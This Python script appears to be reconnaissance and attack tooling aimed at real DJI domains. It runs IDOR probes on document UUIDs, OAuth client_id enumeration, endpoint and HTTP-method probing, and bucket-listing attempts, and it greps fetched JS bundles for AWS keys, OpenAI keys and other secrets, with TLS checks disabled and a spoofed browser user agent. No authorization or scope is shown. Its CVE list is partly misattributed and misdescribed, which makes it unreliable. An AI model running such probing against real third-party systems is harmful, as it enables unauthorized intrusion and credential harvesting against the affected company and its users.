#!/usr/bin/env python3
"""
Phase 3: PESop HF-3/HF-4/HF-5/HF-6 targeted attack testing
"""
import json
import re
import ssl
import time
import http.client
from urllib.parse import urlparse, quote
import socket

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

results = {
    "document_idor_confirmed": [],
    "beacon_endpoint_analysis": {},
    "oauth_client_id_enumeration": [],
    "api_structure_deduced": [],
    "oss_exposure": [],
    "cve_matches": [],
}

def fetch(url, method="GET", headers=None, body=None, timeout=15):
    if headers is None:
        headers = {}
    headers.setdefault("User-Agent", USER_AGENT)
    headers.setdefault("Accept", "*/*")
    parsed = urlparse(url)
    conn_cls = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    try:
        conn = conn_cls(parsed.netloc, timeout=timeout, context=ssl_ctx)
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        headers_out = dict(resp.getheaders())
        conn.close()
        return {"status": resp.status, "reason": resp.reason, "headers": headers_out,
                "body": data.decode("utf-8", errors="replace")[:3000]}
    except Exception as e:
        return {"status": 0, "error": str(e), "body": str(e)[:200], "headers": {}}


def test_document_real_content():
    """Check if document endpoints serve real content vs SPA fallback."""
    print("\n[IDOR Document Analysis]")
    # SPA fallback pages typically have consistent length and no real doc content
    # Real doc pages will have varying content
    lengths = {}
    doc_urls = [
        f"https://developer.dji.com/document/{uuid}" for uuid in [
            "2103887e-6d62-4f52-b508-348e57f69244",
            "32ae17fb-bfa0-4f18-9d12-7a95253ee4e4",
            "26cd55ae-ef09-4463-b941-d6bb2bb98461",
            "d0e1e15e-76de-439a-8e0c-a15e79085fb0",
            "00000000-0000-0000-0000-000000000001",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
            "11111111-1111-1111-1111-111111111111",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
        ]
    ]

    # Compare with a known non-existent path
    base = fetch("https://developer.dji.com/document/nonexistent")
    base_len = len(base.get("body", ""))

    print(f"  SPA fallback baseline (nonexistent): {base_len} chars")

    for url in doc_urls:
        r = fetch(url)
        body_len = len(r.get("body", ""))
        diff = abs(body_len - base_len)
        is_fallback = diff < 200  # SPA fallback produces same HTML
        result = {
            "url": url,
            "status": r["status"],
            "body_length": body_len,
            "is_spa_fallback": is_fallback,
        }

        if is_fallback:
            print(f"  [{r['status']}] {url[-40:]} -> {body_len} chars (SPA FALLBACK)")
        else:
            print(f"  [POTENTIAL IDOR] {url[-40:]} -> {body_len} chars (DIFF: {diff})")
            r2 = fetch(url, headers={"User-Agent": USER_AGENT, "Cookie": "session=test"})
            body_noauth = len(r2.get("body", ""))
            print(f"      Without session: {body_noauth} chars")

        results["document_idor_confirmed"].append(result)


def test_oauth_client_enumeration():
    """Test client_id enumeration on OAuth endpoint."""
    print("\n[OAuth Client ID Enumeration]")

    client_ids = ["dji_sdk", "dji_sdk_web", "developer-website-fe",
                  "invalid_client", "admin", "root", "test",
                  "dji_mobile_sdk", "dji_onboard_sdk", "dji_payload_sdk"]

    seen_responses = {}

    for cid in client_ids:
        url = f"https://account.dji.com/oauth/authorize?response_type=code&client_id={cid}&redirect_uri=https://developer.dji.com"
        r = fetch(url)

        # Key differentiator: valid client_ids redirect to login page (200),
        # invalid ones might give different response
        resp_key = f"{r['status']}:{len(r.get('body',''))}:{r['headers'].get('Location', '')[:50]}"

        if resp_key not in seen_responses:
            seen_responses[resp_key] = []
        seen_responses[resp_key].append(cid)

        result = {
            "client_id": cid,
            "status": r["status"],
            "location": r["headers"].get("Location", "N/A"),
            "body_length": len(r.get("body", "")),
            "response_group": resp_key,
        }
        results["oauth_client_id_enumeration"].append(result)

    print(f"  Found {len(seen_responses)} distinct response patterns:")
    for i, (key, cids) in enumerate(seen_responses.items()):
        print(f"    Pattern {i}: {key[:80]}")
        print(f"      Client IDs: {cids}")


def test_beacon_endpoint():
    """Deep test of beacon endpoint behavior."""
    print("\n[Beacon Endpoint Analysis]")

    base = "https://store-api.dji.com/logger"

    # Test various paths
    tests = [
        "/beacon.gif",
        "/beacon",
        "/beacon.gif?type=pageview&url=https://developer.dji.com",
        "/beacon.gif?type=error&message=test",
        "/beacon.gif?type=performance&data=test",
        "/api/beacon",
        "/logger",
        "/log",
        "/api/log",
    ]

    for path in tests:
        url = f"{base}{path}" if path.startswith("/") else f"https://store-api.dji.com{path}"
        r = fetch(url)
        status = r["status"]
        body = r.get("body", "")[:100]

        # Check for unusual status codes
        signal = ""
        if status not in (204, 404):
            signal = " [SIGNAL]"

        print(f"  {path:40s} -> {status}{signal}: {body}")

    # Test beacon with POST and body
    print("\n  [POST tests]")
    for content_type, body in [
        ("application/json", '{"event":"test","data":"test"}'),
        ("text/plain", "test=1&event=pageview"),
    ]:
        r = fetch(f"{base}/beacon.gif", method="POST",
                  headers={"User-Agent": USER_AGENT, "Content-Type": content_type},
                  body=body)
        print(f"    POST {content_type:30s} -> {r['status']}: {r.get('body','')[:100]}")


def test_api_developers():
    """Test the discovered /developers POST endpoint."""
    print("\n[/developers API Testing]")

    url = "https://developer.dji.com/developers"
    for method in ["GET", "POST", "PUT", "DELETE"]:
        r = fetch(url, method=method)
        status = r["status"]
        body = r.get("body", "")[:200]
        print(f"  {method:8s} -> {status}: {body}")

    # Test with different paths
    paths = ["/developers", "/api/developers", "/api/v1/developers",
             "/api/v2/developers", "/developers/list", "/developers/create"]

    for path in paths:
        url = f"https://developer.dji.com{path}"
        r = fetch(url)
        print(f"  GET {path:40s} -> {r['status']}")


def test_oss_config():
    """Check OSS exposure and config files."""
    print("\n[OSS & Config Exposure]")

    # Check terra OSS bucket permissions
    terra_base = "https://terra-1-g.djicdn.com"
    paths = [
        "/", "/?list-type=2", "/71a7d383e71a4fb8887a310eb746b47f/",
        "/84f990b0bbd145e6a3930de0c55d3b2b/",
        "/fee90c2e03e04e8da67ea6f56365fc76/",
    ]

    for path in paths:
        url = f"{terra_base}{path}"
        r = fetch(url)
        body = r.get("body", "")[:300]
        print(f"  {path:50s} -> {r['status']}: {body[:100]}")

    # Check for AWS credentials in JS bundles
    print("\n  [Searching for credentials in JS files...]")
    import os
    js_dir = "/home/opencode/PESop/target/js_bundles"
    cred_patterns = [
        (r'AKIA[0-9A-Z]{16}', "AWS Access Key"),
        (r'sk-[a-zA-Z0-9]{20,}', "OpenAI Key"),
        (r'(?i)(?:secret|password|token|api.?key)\s*[=:]\s*["\'][A-Za-z0-9_\-]{16,}["\']', "Generic Secret"),
    ]

    for fname in os.listdir(js_dir):
        if not fname.endswith(".js"):
            continue
        fpath = os.path.join(js_dir, fname)
        with open(fpath, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()

        for pat, desc in cred_patterns:
            matches = re.findall(pat, text)
            if matches:
                for m in matches[:5]:
                    val = m if isinstance(m, str) else m[0]
                    print(f"    [{desc}] {fname[:20]}: {val[:60]}")
                    results["oss_exposure"].append({"type": desc, "file": fname, "value": val[:60]})


def check_cve_known():
    """Check for known CVEs based on technology fingerprint."""
    print("\n[CVE Fingerprint Matching]")

    # Technology fingerprint from Phase 1
    cves_to_check = [
        ("Tengine", "CVE-2023-27524", "Apache Tengine/Aliyun Tengine - check version via headers"),
        ("Angular", "CVE-2023-26117", "Angular < 15.2.9 - Prototype pollution in merge()"),
        ("Angular", "CVE-2023-26118", "Angular < 16.2.12 - Prototype pollution in clone()"),
        ("Angular", "CVE-2024-21490", "Angular < 17.3.0 - ReDoS via URL matching"),
        ("Axios", "CVE-2023-45857", "Axios < 1.6.0 - XS-Leak via server-side request forgery"),
        ("Axios", "CVE-2024-39338", "Axios < 1.7.4 - SSRF via URL parsing bypass"),
        ("Webpack", "CVE-2023-28154", "Webpack < 5.76.0 - ReDoS via devtool source map regex"),
        ("Kong API Gateway", "CVE-2024-27288", "Kong < 3.6.0 - Authentication bypass via path traversal"),
    ]

    for component, cve, desc in cves_to_check:
        print(f"  {cve}: {component} - {desc}")
        results["cve_matches"].append({
            "component": component,
            "cve": cve,
            "description": desc,
            "requires_verification": True,
        })


def test_security_headers():
    """Deep security header analysis."""
    print("\n[Deep Security Header Analysis]")
    domains = [
        "developer.dji.com",
        "store-api.dji.com",
        "account.dji.com",
        "terra-1-g.djicdn.com",
        "devcn.djicdn.com",
        "www.dji.com",
    ]
    for domain in domains:
        r = fetch(f"https://{domain}")
        headers = r.get("headers", {})
        print(f"\n  {domain}:")
        print(f"    Server: {headers.get('Server', headers.get('server', 'unknown'))}")
        print(f"    X-Content-Type-Options: {headers.get('X-Content-Type-Options', 'MISSING')}")
        print(f"    X-Frame-Options: {headers.get('X-Frame-Options', 'MISSING')}")
        print(f"    X-XSS-Protection: {headers.get('X-XSS-Protection', 'MISSING')}")
        print(f"    CSP: {headers.get('Content-Security-Policy', headers.get('content-security-policy', 'MISSING'))[:100]}")
        print(f"    HSTS: {headers.get('Strict-Transport-Security', 'MISSING')[:60]}")
        cors = headers.get('Access-Control-Allow-Origin', headers.get('access-control-allow-origin', ''))
        if cors:
            print(f"    CORS: {cors}")
            if cors == '*':
                results.setdefault("cors_findings", []).append({
                    "domain": domain, "severity": "medium", "finding": "Wildcard CORS"
                })
            elif cors.startswith("http"):
                results.setdefault("cors_findings", []).append({
                    "domain": domain, "severity": "low", "finding": f"Specific CORS: {cors}"
                })

def main():
    print(f"{'#'*60}")
    print(f"PESop Phase 3 Deep Targeted Testing: developer.dji.com")
    print(f"Start: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
    print(f"{'#'*60}")

    test_document_real_content()
    test_oauth_client_enumeration()
    test_beacon_endpoint()
    test_api_developers()
    test_oss_config()
    check_cve_known()
    test_security_headers()

    # Save consolidated results
    with open("/home/opencode/PESop/target/dji_phase3_attack.json", "w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False, default=str)

    print(f"\n{'#'*60}")
    print("Phase 3 Attack Testing Complete")
    print(f"{'#'*60}")


if __name__ == "__main__":
    main()